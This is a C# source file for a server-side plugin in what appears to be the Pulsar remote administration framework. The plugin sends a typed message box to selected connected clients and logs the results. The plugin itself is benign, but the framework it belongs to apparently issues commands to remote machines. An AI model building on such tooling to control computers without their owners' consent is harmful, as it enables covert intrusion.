using System;
using System.Collections.Generic;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Reflection;
using System.Net;
using Pulsar.Server.Plugins;
using Pulsar.Server.Networking;
using Pulsar.Server.Messages;

namespace Pulsar.Plugin.MessageBox.Server
{
    /// <summary>
    /// Server-side plugin that sends message box commands to clients
    /// and displays their responses
    /// </summary>
    public class MessageBoxServerPlugin : IServerPlugin
    {
        public string Name => "MessageBox Plugin";
        public Version Version => new Version(1, 0, 0);
        public string Description => "Sends message boxes to clients and receives responses";
        public string Type => "Communication";
        public bool AutoLoadToClients => false;

        private IServerContext _context;
        private PendingMessageManager _pendingManager;
        private ResponseHandler _responseHandler;

        public void Initialize(IServerContext context)
        {
            _context = context;
            _pendingManager = new PendingMessageManager();
            _responseHandler = new ResponseHandler(context, _pendingManager);

            UniversalPluginResponseHandler.ResponseReceived += _responseHandler.HandleResponse;

            _context.AddClientContextMenuItem(
                "MessageBox Plugin",
                "Send Message Box",
                OnSendMessageBox
            );

            _context.Log($"{Name} v{Version} loaded successfully");
        }

        private void OnSendMessageBox(IReadOnlyList<Client> clients)
        {
            if (clients == null || clients.Count == 0)
            {
                MessageBoxDisplay.ShowNoClientSelected();
                return;
            }

            string message = MessageInputDialog.Show(_context);
            if (message != null)
            {
                foreach (var client in clients)
                {
                    SendMessageBoxCommand(client, message);
                }

                _context.Log($"Sent message box command to {clients.Count} client(s)");
            }
        }

        private void SendMessageBoxCommand(Client client, string message)
        {
            try
            {
                byte[] messageBytes = Encoding.UTF8.GetBytes(message);
                PushSender.ExecuteUniversalCommand(
                    client,
                    "messagebox-plugin",
                    "show-message",
                    messageBytes
                );

                string key = client.EndPoint.ToString();
                _pendingManager.Add(key, message);

                _context.Log($"Sent message box to {client.EndPoint}");
            }
            catch (Exception ex)
            {
                _context.Log($"Error sending message box to {client.EndPoint}: {ex.Message}");
                MessageBoxDisplay.ShowSendError(ex.Message);
            }
        }
    }
}